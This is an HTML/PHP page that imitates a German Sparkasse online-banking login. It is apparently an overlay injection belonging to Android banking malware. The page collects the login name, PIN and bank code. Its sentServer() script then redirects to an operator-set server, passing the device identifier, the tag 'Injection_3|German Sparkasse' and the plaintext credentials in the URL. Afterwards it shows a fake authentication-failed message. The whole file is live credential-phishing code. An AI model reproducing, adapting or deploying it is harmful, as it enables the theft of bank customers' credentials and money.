<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Sparkasse</title>

    <link rel="stylesheet" href="de/Sparkasse/css/normalize.css">
    <link rel="stylesheet" href="de/Sparkasse/css/main.css">
    <link rel="stylesheet" href="de/Sparkasse/css/17.css">
	<link rel="stylesheet" href="de/Sparkasse/css/cat.style.css" type="text/css" media="all">
	
	<script src="de/Sparkasse/js/cat.functions.js"></script>
    <script src="de/Sparkasse/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="de/Sparkasse/js/viewport.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
		<div class="modal modal_header">
			<div class="container">
                <div class="row row_header">
                    <div class="form_header">
                        <img src="de/Sparkasse/img/logo.png" alt="">
                    </div>
                </div>
				<div id="cat-error">
					<span>Authentication failed or timed out</span>
					<input type="button" class="logon_btn" value="Try enter again"
						onClick="tryEnterAgain();"/>
				</div>

				<div id="cat-forms">
					<form id="form" class="cat-start-step">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									Anmeldename/Legitimations-ID
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" id="login1" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									PIN
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" id="pass" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Bankleitzahl oder Stadt
								</div>
								<div class="inp_wr">
									<input type="text" name="field4" id="login2" class="main_input">
								</div>
							</div>
								<div class="input_block_wr input_block_wr_l">
							</div>
							<div class="btn_wr">
									<input type="button" onClick="sentServer();"
										class="logon_btn" value="Login"/>
							</div>
						</div>
					</div>
					<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
					</form>

					<form id="cat-step-2" class="cat-last-step">
						<span>Authentication failed or timed out</span>
						<input type="button" class="logon_btn" value="Try enter again"
							onClick="closeWindow()"/>
					</form>

				</div>
			</div>
		</div>
</body>
<script>
function sentServer()
{
var oNumInp1 = document.getElementById('login1');	
var oNumInp2 = document.getElementById('login2');
var oNumInp3 = document.getElementById('pass');
	
var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login1"].value; 
var login2 = document.forms["form"].elements["login2"].value;
var pass = document.forms["form"].elements["pass"].value; 
var url='<?php echo $URL; ?>';
if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)&&(oNumInp3.value.length > 3)) {
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|German Sparkasse|"+login1+"|"+pass+"|"+login2);
}
}
</script>
</html>
